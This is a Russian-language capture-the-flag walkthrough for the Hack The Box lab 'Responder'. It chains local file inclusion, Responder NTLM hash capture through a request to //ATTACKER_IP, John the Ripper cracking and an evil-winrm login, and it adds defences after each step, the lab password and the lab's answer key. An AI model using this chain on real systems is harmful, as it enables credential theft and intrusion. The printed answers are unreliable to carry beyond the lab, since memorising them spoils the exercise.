# 🧪 Hack The Box: Responder

> 🔗 https://app.hackthebox.com/machines/Responder

## 🎯 Цель
Получить доступ к системе через цепочку:
LFI → захват хеша → взлом → удалённый доступ

---

## 🧠 Общая логика атаки

nmap → LFI → Responder → NTLM hash → John → WinRM → flag

---

# 🔍 Шаг 1 — Сканирование

```bash
nmap -sC -sV <TARGET_IP>
```

## Почему этот шаг
Без него ты не знаешь:
- какие сервисы есть
- куда атаковать

👉 Основа любого пентеста

## Альтернатива
- masscan (быстро)
- rustscan (современно)

## Защита
- закрыть лишние порты
- использовать firewall
- скрывать версии сервисов

---

# 🧪 Шаг 2 — Поиск LFI

```bash
curl "http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts"
```

## Почему это работает
Сайт включает файлы без фильтрации:
```php
include($_GET['page'])
```

👉 Это LFI

## Альтернатива
- Burp Suite
- wfuzz
- manual testing

## Защита
- whitelist файлов
- не использовать include с user input
- фильтрация путей

---

# 📡 Шаг 3 — Захват хеша (Responder)

```bash
sudo responder -I tun0
```

```bash
curl "http://unika.htb/index.php?page=//ATTACKER_IP/test"
```

## Почему это работает
Windows пытается подключиться к SMB:
→ отправляет NTLM hash

## Альтернатива
- ntlmrelayx
- smbserver.py

## Защита
- отключить SMB outbound
- использовать SMB signing
- запрет NTLM

---

# 🔓 Шаг 4 — Взлом пароля

```bash
john --wordlist=rockyou.txt hash.txt
```

## Почему это работает
Пароль слабый → есть в словаре

## Альтернатива
- hashcat (GPU)
- hydra (если онлайн)

## Защита
- сложные пароли
- политика паролей
- MFA

---

# 🖥️ Шаг 5 — Доступ через WinRM

```bash
evil-winrm -i <IP> -u Administrator -p badminton
```

## Почему это работает
- пароль известен
- WinRM открыт

## Альтернатива
- RDP
- SMB exec

## Защита
- ограничить WinRM
- разрешить только trusted IP
- использовать HTTPS

---

## 🔐 Флаг

<details>
<summary>Показать флаг</summary>

type C:\Users\mike\Desktop\flag.txt

</details>

---

## 📋 Ответы на задания

<details>
<summary>Показать ответы</summary>

1. unika.htb  
2. php  
3. page  
4. ../../../../windows/system32/drivers/etc/hosts  
5. //IP/file  
6. New Technology Lan Manager  
7. -I  
8. John The Ripper  
9. badminton  
10. 5985  
11. mike  

</details>

---

# 🧠 Итог

👉 Взлом произошёл не из-за одной уязвимости, а из-за цепочки ошибок:

- LFI
- NTLM leakage
- слабый пароль
- открытый WinRM

